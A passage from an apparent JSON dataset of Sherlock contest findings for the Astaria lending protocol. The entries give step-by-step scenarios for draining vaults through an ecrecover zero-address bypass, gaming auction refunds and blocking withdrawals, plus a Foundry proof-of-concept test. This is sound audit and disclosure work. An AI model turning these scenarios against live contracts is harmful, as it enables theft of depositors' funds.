consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Sherlock-Audit project. The issue, H-32, is that strategists are being paid 10x the vault fee due to a math error. The bug was found by obront and the code snippet can be found at the given link. \n\nThe issue is caused by a mistake in the `_handleStrategistInterestReward()` function, which is intended to take the amount being paid, adjust it by the vault fee to get the fee amount, and convert that amount of value into shares. The mistake is that the vault fee is stored in basis points, but is divided by 1,000 instead of 10,000. This results in strategists earning 10x whatever vault fee they set.\n\nThe impact of this issue is that strategists will be paid 10x the agreed upon rate for their role, with the cost being borne by users. The recommendation is to change the `1000` in the `_handleStrategistInterestReward()` function to `10_000`.\n\nThe discussion on the issue includes two escalations, one for 1 USDC and one for 5 USDC. The first escalation was accepted, while the second was accepted after further discussion. After both escalations were accepted, contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/49",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3669",
      "title": "H-31: Auctions can end in epoch after intended, underpaying withdrawers",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/51 \n\n## Found by \nobront\n\n## Summary\n\nWhen liens are liquidated, the router checks if the auction will complete in a future epoch and, if it does, sets up a liquidation accountant and other logistics to account for it. However, the check for auction completion does not take into account extended auctions, which can therefore end in an unexpected epoch and cause accounting issues, losing user funds.\n\n## Vulnerability Detail\n\nThe liquidate() function performs the following check to determine if it should set up the liquidation to be paid out in a future epoch:\n\n```solidity\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\nThis function assumes that the auction will only end in a future epoch if the `auctionWindow` (typically set to 2 days) pushes us into the next epoch.\n\nHowever, auctions can last up to an additional 1 day if bids are made within the final 15 minutes. In these cases, auctions are extended repeatedly, up to a maximum of 1 day.\n\n```solidity\nif (firstBidTime + duration - block.timestamp < timeBuffer) {\n  uint64 newDuration = uint256(\n    duration + (block.timestamp + timeBuffer - firstBidTime)\n  ).safeCastTo64();\n  if (newDuration <= auctions[tokenId].maxDuration) {\n    auctions[tokenId].duration = newDuration;\n  } else {\n    auctions[tokenId].duration =\n      auctions[tokenId].maxDuration -\n      firstBidTime;\n  }\n  extended = true;\n}\n```\nThe result is that there are auctions for which accounting is set up for them to end in the current epoch, but will actual end in the next epoch. \n\n## Impact\n\nUsers who withdrew their funds in the current epoch, who are entitled to a share of the auction's proceeds, will not be paid out fairly.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L415\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L127-L146\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the check to take the possibility of extension into account:\n\n```solidity\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow() + 1 days)\n```\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nThe specific issue address in this submission is incorrect. It passes COLLATERAL_TOKEN.auctionWindow() + 1 days (max possible duration of an auction) into handleNewLiquidation which makes this a non issue. \n\nRelevant Lines:\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/7d12a5516b7c74099e1ce6fb4ec87c102aec2786/src/AstariaRouter.sol#L407-L410\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> The specific issue address in this submission is incorrect. It passes COLLATERAL_TOKEN.auctionWindow() + 1 days (max possible duration of an auction) into handleNewLiquidation which makes this a non issue. \n> \n> Relevant Lines:\n> https://github.com/sherlock-audit/2022-10-astaria/blob/7d12a5516b7c74099e1ce6fb4ec87c102aec2786/src/AstariaRouter.sol#L407-L410\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected. \n\nThe `if` in https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L391 is missing the auction window extension of 1 day.  This leads to auctions with extended durations overlapping the current epoch and not having liquidation accountants in place\n\n**sherlock-admin**\n\n> Escalation rejected. \n> \n> The `if` in https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L391 is missing the auction window extension of 1 day.  This leads to auctions with extended durations overlapping the current epoch and not having liquidation accountants in place\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter.sol codebase of the Astaria project. The issue is that when liens are liquidated, the router checks if the auction will complete in a future epoch and, if it does, sets up a liquidation accountant and other logistics to account for it. However, the check for auction completion does not take into account extended auctions, which can therefore end in an unexpected epoch and cause accounting issues, losing user funds.\n\nThe liquidate() function performs the following check to determine if it should set up the liquidation to be paid out in a future epoch:\n\n```solidity\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\nThis function assumes that the auction will only end in a future epoch if the `auctionWindow` (typically set to 2 days) pushes us into the next epoch.\n\nHowever, auctions can last up to an additional 1 day if bids are made within the final 15 minutes. In these cases, auctions are extended repeatedly, up to a maximum of 1 day. As a result, there are auctions for which accounting is set up for them to end in the current epoch, but will actual end in the next epoch. \n\nUsers who withdrew their funds in the current epoch, who are entitled to a share of the auction's proceeds, will not be paid out fairly. The recommendation is to change the check to take the possibility of extension into account:\n\n```solidity\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow() + 1 days)\n```\n\nThe code snippets related to this issue can be found at the following links: \nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L415\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L127-L146\n\nThe bug was found by manual review and was escalated for 1 USDC. The escalation was rejected as the `if` in the",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/51",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3668",
      "title": "H-30: Any public vault without a delegate can be drained",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/69 \n\n## Found by \nobront, HonorLt, yixxas, rvierdiiev, zzykxx, cryptphi\n\n## Summary\n\nIf a public vault is created without a delegate, delegate will have the value of `address(0)`. This is also the value returned by `ecrecover` for invalid signatures (for example, if v is set to a position number that is not 27 or 28), which allows a malicious actor to cause the signature validation to pass for arbitrary parameters, allowing them to drain a vault using a worthless NFT as collateral.\n\n## Vulnerability Detail\n\nWhen a new Public Vault is created, the Router calls the `init()` function on the vault as follows:\n\n```solidity\nVaultImplementation(vaultAddr).init(\n  VaultImplementation.InitParams(delegate)\n);\n```\nIf a delegate wasn't set, this will pass `address(0)` to the vault. If this value is passed, the vault simply skips the assignment, keeping the delegate variable set to the default 0 value:\n\n```solidity\nif (params.delegate != address(0)) {\n  delegate = params.delegate;\n}\n```\nOnce the delegate is set to the zero address, any commitment can be validated, even if the signature is incorrect. This is because of a quirk in `ecrecover` which returns `address(0)` for invalid signatures. A signature can be made invalid by providing a positive integer that is not 27 or 28 as the `v` value. The result is that the following function call assigns `recovered = address(0)`:\n\n```solidity\n    address recovered = ecrecover(\n      keccak256(\n        encodeStrategyData(\n          params.lienRequest.strategy,\n          params.lienRequest.merkle.root\n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n```\nTo confirm the validity of the signature, the function performs two checks:\n```solidity\nrequire(\n  recovered == params.lienRequest.strategy.strategist,\n  \"strategist must match signature\"\n);\nrequire(\n  recovered == owner() || recovered == delegate,\n  \"invalid strategist\"\n);\n```\nThese can be easily passed by setting the `strategist` in the params to `address(0)`. At this point, all checks will pass and the parameters will be accepted as approved by the vault.\n\nWith this power, a borrower can create params that allow them to borrow the vault's full funds in exchange for a worthless NFT, allowing them to drain the vault and steal all the user's funds.\n\n## Impact\n\nAll user's funds held in a vault with no delegate set can be stolen.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L537-L539\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L118-L124\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L167-L185\n\n## Tool used\n\nManual Review, Foundry\n\n## Recommendation\n\nAdd a require statement that the recovered address cannot be the zero address:\n\n```solidity\nrequire(recovered != address(0));\n```\n\n## Discussion\n\n**sherlock-admin**\n\n> Escalate for 1 USDC\n> \n> Disagree with high. Requires a external factors and a bit of phishing to make this work. User would have to voluntarily make a lien position that has strategist == address(0) which should raise red flags. Medium seems more fitting. \n> \n> Relevant lines:\n> \n> https://github.com/sherlock-audit/2022-10-astaria/blob/7d12a5516b7c74099e1ce6fb4ec87c102aec2786/src/VaultImplementation.sol#L178-L181\n> \n> \n\nYou've deleted an escalation for this issue.\n\n**zobront**\n\nEscalate for 5 USDC\n\nThis may be the most severe flaw in the whole protocol. Definitely deserves to be a high.\n\nI’m not sure why it was downgraded, but the deleted escalation seems to think that the strategist needs to be address(0). This isn’t the case. We just need to set the strategist to address(0) in our fake data to make the signature pass.\n\nThe delegate is a separate role that can be given access, and any user that doesn’t set a delegate will default to delegate being set to address(0).\n\nAny of these vaults can be drained for every single dollar in the vault due to this flaw.\n\nAs you can see from the dups, every single one that realized this exploit marked it as a high. The only mediums are the ones that caught the zero address gap but didn’t understand how it was exploitable.\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> This may be the most severe flaw in the whole protocol. Definitely deserves to be a high.\n> \n> I’m not sure why it was downgraded, but the deleted escalation seems to think that the strategist needs to be address(0). This isn’t the case. We just need to set the strategist to address(0) in our fake data to make the signature pass.\n> \n> The delegate is a separate role that can be given access, and any user that doesn’t set a delegate will default to delegate being set to address(0).\n> \n> Any of these vaults can be drained for every single dollar in the vault due to this flaw.\n> \n> As you can see from the dups, every single one that realized this exploit marked it as a high. The only mediums are the ones that caught the zero address gap but didn’t understand how it was exploitable.\n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug has been identified in the Astaria protocol that allows malicious actors to drain a public vault without a delegate. The bug occurs when the vault is initialized with a value of `address(0)` for the delegate. This is the same value returned by `ecrecover` for invalid signatures, which allows the malicious actor to pass the signature validation for arbitrary parameters. This allows them to borrow the vault's full funds in exchange for a worthless NFT, allowing them to drain the vault and steal all the user's funds. The code snippet and tool used to identify the bug are provided in the report. The recommended fix is to add a require statement that the recovered address cannot be the zero address. The impact of this bug is that all user's funds held in a vault with no delegate set can be stolen. The bug has been accepted and the contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/69",
      "tags": [],
      "finders": [
        "yixxas",
        "cryptphi",
        "HonorLt",
        "rvierdiiev",
        "obront",
        "zzykxx"
      ]
    },
    {
      "id": "3667",
      "title": "H-29: nlrType type is not signed by strategist, which could allow fraudulent behavior as new types are added",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/72 \n\n## Found by \nobront\n\n## Summary\n\nThe strategist signs the merkle root, their nonce, and the deadline of all strategies to ensure that new borrowers meet their criteria. However, the lien type (`nlrType`) is not signed. Currently, the structs for the different types are unique, so there is no ability to borrow one type as another, but if struct schemas of different types overlap in the future, this will open the door for exploits.\n\n## Vulnerability Detail\n\nWhen a new lien is requested, the borrower submits a Lien Request, which is filled with the parameters at which they would like to borrow. This is kept honest and aligned with the lenders intent because the merkle root, strategist nonce, and deadline are all signed by the strategist.\n\nBecause the merkle root is signed, the borrower must submit lien parameters (`nlrDetails`) that align with one of the strategies that the strategist has chosen to allow (represented as leaves in the merkle tree). The schemas of these signed structs differ depending on the validator being used, which is defined in the `nlrType` parameter.\n\nCurrently, each of the validators has a unique schema for their struct. However, if there is an overlap in the schema of the Details struct of multiple validators, where the different parameters represent different values, it opens the door to having a fraudulent lien accepted.\n\nHere's an example of how this might work:\n- Type A has a Details struct with the shape { uint8 version, bool requirementX, IAstariaRouter.LienDetails lien }. \n- The lender includes in their merkle tree the following { version: 1, requirementX: true, lien: { ... maxAmount: 1 ether ... }\n- Type B has a Details struct with the shape { uint8 version, bool requirementY, IAstariaRouter.LienDetails lien }\n- The lender includes in their merkle tree the following strategy: { version: 1, requirementY: true, lien { ... maxAmount: 1 ether ... }\n- The lender signs a merkle root including both of these strategies\n- A borrower who meets requirementX but not requirementY could submit `lienDetails` with `nlrType = Type A` and send the validation to the wrong strategy validator, thus bypassing the expected checks\n\n## Impact\n\nAs more strategy types are added, conflicts in struct schemas could open the door to fraudulent behavior.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L222-L232\n\nCurrent Details struct schemas:\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/strategies/CollectionValidator.sol#L19-L24\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/strategies/UNI_V3Validator.sol#L21-L31\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/strategies/UniqueValidator.sol#L19-L25\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInclude the `nlrType` in the data signed by the strategist. The easiest way to do this would be to pack it in with each leaf when assembling the leaves that will create the merkle tree:\n\n```solidity\nfunction assembleLeaf(ICollectionValidator.Details memory details, address nlrType)\n  public\n  pure\n  returns (bytes memory)\n{\n  return abi.encode(details, nlrType);\n}\n\nfunction validateAndParse... {\n  ...\n  leaf = keccak256(assembleLeaf(cd, params.nlrType));\n}\n```",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter smart contract, where the lien type (`nlrType`) is not signed by the strategist. This could potentially lead to fraudulent behavior in the future if the struct schemas of different types overlap. \n\nWhen a new lien is requested, the borrower submits a Lien Request, which is filled with the parameters at which they would like to borrow. Currently, each of the validators has a unique schema for their struct. However, if there is an overlap in the schema of the Details struct of multiple validators, where the different parameters represent different values, it opens the door to having a fraudulent lien accepted.\n\nThe recommendation is to include the `nlrType` in the data signed by the strategist. This can be done by packing it in with each leaf when assembling the leaves that will create the merkle tree. \n\nIf this issue is not addressed, it could lead to fraudulent behavior as more strategy types are added in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/72",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3666",
      "title": "H-28: Possible to fully block PublicVault.processEpoch function. No one will be able to receive their funds",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/88 \n\n## Found by \nTurnipBoy, rvierdiiev\n\n## Summary\nPossible to fully block `PublicVault.processEpoch` function. No one will be able to receive their funds\n## Vulnerability Detail\nWhen liquidity providers want to redeem their share from `PublicVault` they call `redeemFutureEpoch` function which will create new `WithdrawProxy` for the epoch(if not created already) and then mint shares for redeemer in `WithdrawProxy`. PublicVault [transfer](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L190) user's shares to himself.\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L178-L212\n```solidity\n  function redeemFutureEpoch(\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n  ) public virtual returns (uint256 assets) {\n    // check to ensure that the requested epoch is not the current epoch or in the past\n    require(epoch >= currentEpoch, \"Exit epoch too low\");\n\n\n    require(msg.sender == owner, \"Only the owner can redeem\");\n    // check for rounding error since we round down in previewRedeem.\n\n\n    ERC20(address(this)).safeTransferFrom(owner, address(this), shares);\n\n\n    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n    _deployWithdrawProxyIfNotDeployed(epoch);\n\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n\n    // WithdrawProxy shares are minted 1:1 with PublicVault shares\n    WithdrawProxy(withdrawProxies[epoch]).mint(receiver, shares); // was withdrawProxies[withdrawEpoch]\n  }\n```\n\nThis function mints `WithdrawProxy` shares 1:1 to redeemed `PublicVault` shares.\nThen later after call of `processEpoch` and `transferWithdrawReserve` the funds will be sent to the WithdrawProxy and users can now redeem their shares from it.\n\nFunction `processEpoch` decides how many funds should be sent to the `WithdrawProxy`.\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L268-L289\n```solidity\n    if (withdrawProxies[currentEpoch] != address(0)) {\n      uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch])\n        .totalSupply();\n\n\n      liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply());\n\n\n      if (liquidationAccountants[currentEpoch] != address(0)) {\n        LiquidationAccountant(liquidationAccountants[currentEpoch])\n          .setWithdrawRatio(liquidationWithdrawRatio);\n      }\n\n\n      uint256 withdrawAssets = convertToAssets(proxySupply);\n      // compute the withdrawReserve\n      uint256 withdrawLiquidations = liquidationsExpectedAtBoundary[\n        currentEpoch\n      ].mulDivDown(liquidationWithdrawRatio, 1e18);\n      withdrawReserve = withdrawAssets - withdrawLiquidations;\n      // burn the tokens of the LPs withdrawing\n      _burn(address(this), proxySupply);\n\n\n      _decreaseYIntercept(withdrawAssets);\n    }\n```\n\nThis is how it is decided how much money should be sent to WithdrawProxy.\nFirstly, we look at totalSupply of WithdrawProxy. \n`uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch]).totalSupply();`.\n\nAnd then we convert them to assets amount.\n`uint256 withdrawAssets = convertToAssets(proxySupply);`\n\nIn the end function burns `proxySupply` amount of shares controlled by PublicVault.\n` _burn(address(this), proxySupply);`\n\nThen this amount is allowed to be sent(if no auctions currently, but this is not important right now).\n\nThis all allows to attacker to make `WithdrawProxy.deposit` to mint new shares for him and increase totalSupply of WithdrawProxy, so `proxySupply` becomes more then was sent to `PublicVault`.\n\nThis is attack scenario.\n\n1.PublicVault is created and funded with 50 ethers.\n2.Someone calls `redeemFutureEpoch` function to create new WithdrawProxy for next epoch.\n3.Attacker sends 1 wei to WithdrawProxy to make totalAssets be > 0. Attacker deposit to WithdrawProxy 1 wei. Now WithdrawProxy.totalSupply > PublicVault.balanceOf(PublicVault).\n4.Someone call `processEpoch` and it reverts on burning.\n\nAs result, nothing will be send to WithdrawProxy where shares were minted for users. The just lost money.\n\nAlso this attack can be improved to drain users funds to attacker. \nAttacker should be liquidity provider. And he can initiate next redeem for next epoch, then deposit to new WithdrawProxy enough amount to get new shares. And call `processEpoch` which will send to the vault amount, that was not sent to previous attacked WithdrawProxy, as well. So attacker will take those funds.\n## Impact\nFunds of PublicVault depositors are stolen.\n## Code Snippet\nThis is simple test that shows how external actor can corrupt WithdrawProxy.\n\n```solidity\nfunction testWithdrawProxyDdos() public {\n    Dummy721 nft = new Dummy721();\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(1);\n\n    address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n    });\n\n    _lendToVault(\n      Lender({addr: address(1), amountToLend: 50 ether}),\n      publicVault\n    );\n\n    uint256 collateralId = tokenContract.computeId(tokenId);\n\n    uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));\n    console.log(\"balance: \", vaultTokenBalance);\n\n    // _signalWithdrawAtFutureEpoch(address(1), publicVault, uint64(1));\n    _signalWithdraw(address(1), publicVault);\n\n    address withdrawProxy = PublicVault(publicVault).withdrawProxies(\n      PublicVault(publicVault).getCurrentEpoch()\n    );\n\n    vm.deal(address(2), 2);\n    vm.startPrank(address(2));\n      WETH9.deposit{value: 2}();\n      //this we need to make share calculation not fail with divide by 0\n      WETH9.transferFrom(address(2), withdrawProxy, 1);\n      WETH9.approve(withdrawProxy, 1);\n      \n      //deposit 1 wei to make WithdrawProxy.totalSupply > PublicVault.balanceOf(address(PublicVault))\n      //so processEpoch can't burn more shares\n      WithdrawProxy(withdrawProxy).deposit(1, address(2));\n    vm.stopPrank();\n\n    assertEq(vaultTokenBalance, IERC20(withdrawProxy).balanceOf(address(1)));\n\n    vm.warp(block.timestamp + 15 days);\n\n    //processEpoch fails, because it can't burn more amount of shares, that was sent to PublicVault\n    vm.expectRevert();\n    PublicVault(publicVault).processEpoch();\n  }\n```\n## Tool used\n\nManual Review\n\n## Recommendation\nMake function WithdrawProxy.deposit not callable.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nCauses total loss of funds for LPs when this happens. High risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Causes total loss of funds for LPs when this happens. High risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about a vulnerability in the \"PublicVault.processEpoch\" function of the Astaria project. This vulnerability can be exploited by an attacker to fully block the function and prevent users from receiving their funds. \n\nThe attack works by first having someone call the \"redeemFutureEpoch\" function to create a new WithdrawProxy for the next epoch. Then, the attacker sends 1 wei to the WithdrawProxy to increase the totalSupply. After this, someone calls the \"processEpoch\" function, which reverts when it tries to burn the tokens of the LPs withdrawing. As a result, nothing is sent to the WithdrawProxy where the shares were minted for users, and they lose their money.\n\nThe attack can also be improved to drain users' funds to the attacker. The attacker has to be a liquidity provider and initiate a redeem for the next epoch, then deposit enough to the new WithdrawProxy to get new shares. After this, they call the \"processEpoch\" function, which will send to the vault the amount that was not sent to the previous attacked WithdrawProxy.\n\nThe impact of this vulnerability is that the funds of PublicVault depositors are stolen. A code snippet was also included to show how an external actor can corrupt the WithdrawProxy. The recommendation is to make the WithdrawProxy.deposit function not callable. \n\nThe bug was found by TurnipBoy and rvierdiiev, and was discussed by IAmTurnipBoy, sherlock-admin, and Evert0x. IAmTurnipBoy suggested an escalation for 1 USDC, which was accepted by sherlock-admin. This means that the contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/88",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "TurnipBoy"
      ]
    },
    {
      "id": "3665",
      "title": "H-27: Bidder can cheat auction by placing bid much higher than reserve price when there are still open liens against a token",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/107 \n\n## Found by \nTurnipBoy\n\n## Summary\n\nWhen a token still has open liens against it only the value of the liens will be paid by the bidder but their current bid will be set to the full value of the bid. This can be abused in one of two ways. The bidder could place a massive bid like 500 ETH that will never be outbid or they could place a bid they know will outbid and profit the difference when they're sent a refund.\n\n## Vulnerability Detail\n\n    uint256[] memory liens = LIEN_TOKEN.getLiens(tokenId);\n    uint256 totalLienAmount = 0;\n    if (liens.length > 0) {\n      for (uint256 i = 0; i < liens.length; ++i) {\n        uint256 payment;\n        uint256 lienId = liens[i];\n\n        ILienToken.Lien memory lien = LIEN_TOKEN.getLien(lienId);\n\n        if (transferAmount >= lien.amount) {\n          payment = lien.amount;\n          transferAmount -= payment;\n        } else {\n          payment = transferAmount;\n          transferAmount = 0;\n        }\n        if (payment > 0) {\n          LIEN_TOKEN.makePayment(tokenId, payment, lien.position, payer);\n        }\n      }\n    } else {\n      //@audit-issue logic skipped if liens.length > 0\n      TRANSFER_PROXY.tokenTransferFrom(\n        weth,\n        payer,\n        COLLATERAL_TOKEN.ownerOf(tokenId),\n        transferAmount\n      );\n    }\n\nWe can examine the payment logic inside `_handleIncomingPayment` and see that if there are still open liens against then only the amount of WETH to pay back the liens will be taken from the payer, since the else portion of the logic will be skipped.\n\n    uint256 vaultPayment = (amount - currentBid);\n\n    if (firstBidTime == 0) {\n      auctions[tokenId].firstBidTime = block.timestamp.safeCastTo64();\n    } else if (lastBidder != address(0)) {\n      uint256 lastBidderRefund = amount - vaultPayment;\n      _handleOutGoingPayment(lastBidder, lastBidderRefund);\n    }\n    _handleIncomingPayment(tokenId, vaultPayment, address(msg.sender));\n\n    auctions[tokenId].currentBid = amount;\n    auctions[tokenId].bidder = address(msg.sender);\n\nIn `createBid`, `auctions[tokenId].currentBid` is set to `amount` after the last bidder is refunded and the excess is paid against liens. We can walk through an example to illustrate this:\n\nAssume a token with a single lien of amount 10 WETH and an auction is opened for that token. Now a user places a bid for 20 WETH. They are the first bidder so `lastBidder = address(0)` and `currentBid = 0`. `_handleIncomingPayment` will be called with a value of 20 WETH since there is no lastBidder to refund. Inside `_handleIncomingPayment` the lien information is read showing 1 lien against the token. Since `transferAmount >= lien.amount`, `payment = lien.amount`. A payment will be made by the bidder against the lien for 10 WETH. After the payment `_handleIncomingPayment` will return only having taken 10 WETH from the bidder. In the next line currentBid is set to 20 WETH but the bidder has only paid 10 WETH. Now if they are outbid, the new bidder will have to refund then 20 WETH even though they initially only paid 10 WETH.\n\n## Impact\n\nBidder can steal funds due to `_handleIncomingPayment` not taking enough WETH\n\n## Code Snippet\n\nhttps://github.com/AstariaXYZ/astaria-gpl/blob/64acee1122a71b23eef037f69cef4c0c087241be/src/AuctionHouse.sol#L250-L304\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIn `_handleIncomingPayment`, all residual transfer amount should be sent to `COLLATERAL_TOKEN.ownerOf(tokenId)`.",
      "summary": "\nThis bug report is about a vulnerability found in the AuctionHouse.sol smart contract, which is part of the AstariaXYZ platform. The vulnerability allows a bidder to cheat an auction by placing a bid much higher than the reserve price when there are still open liens against a token. This can be exploited by the bidder in two ways: either placing a massive bid that will never be outbid or placing a bid they know will outbid and profit the difference when they're sent a refund. \n\nThe vulnerability is due to the payment logic inside the `_handleIncomingPayment` function, which only takes the amount of WETH to pay back the liens from the payer and not the full amount of the bid. This means that when the current bid is set to the full value of the bid, the bidder has only paid for the liens and not the full amount of their bid. If they are then outbid, they will be refunded the full amount of their bid even though they only paid for the liens. \n\nThe code snippet provided in the bug report can be found at the following link: https://github.com/AstariaXYZ/astaria-gpl/blob/64acee1122a71b23eef037f69cef4c0c087241be/src/AuctionHouse.sol#L250-L304. The bug was found through manual review and the recommendation is to change the logic in `_handleIncomingPayment` so that all residual transfer amount is sent to `COLLATERAL_TOKEN.ownerOf(tokenId)`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/107",
      "tags": [],
      "finders": [
        "TurnipBoy"
      ]
    },
    {
      "id": "3664",
      "title": "H-26: Lack of access control in PublicVault.sol#transferWithdrawReserve let user call transferWithdrawReserve() multiple times to modify withdrawReserve",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/163 \n\n## Found by \nJeiwan, ctf\\_sec\n\n## Summary\n\nLack of access control in PublicVault.sol#transferWithdrawReserve let user call transferWithdrawReserve() multiple times to modify withdrawReserve\n\n## Vulnerability Detail\n\nThe function PublicVault.sol#transferWithdrawReserve() is meants to transfers funds from the PublicVault to the WithdrawProxy.\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L341-L363\n\nHowever, this function has no access control, anyone can call it multiple times to modify the withdrawReserve value\n\n## Impact\n\nA malicious actor can keep calling the function transferWthdrawReserve() before the withdrawal proxy is created.\n\nIf the underlying proxy has address(0), the transfer is not performed, but the state withdrawReserves is decremented.\n\nThen user can invoke this function to always decrement the withdrawReserve to 0\n\n```solidity\n    // prevent transfer of more assets then are available\n    if (withdrawReserve <= withdraw) {\n      withdraw = withdrawReserve;\n      withdrawReserve = 0;\n    } else {\n      withdrawReserve -= withdraw;\n    }\n```\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L341-L363\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe 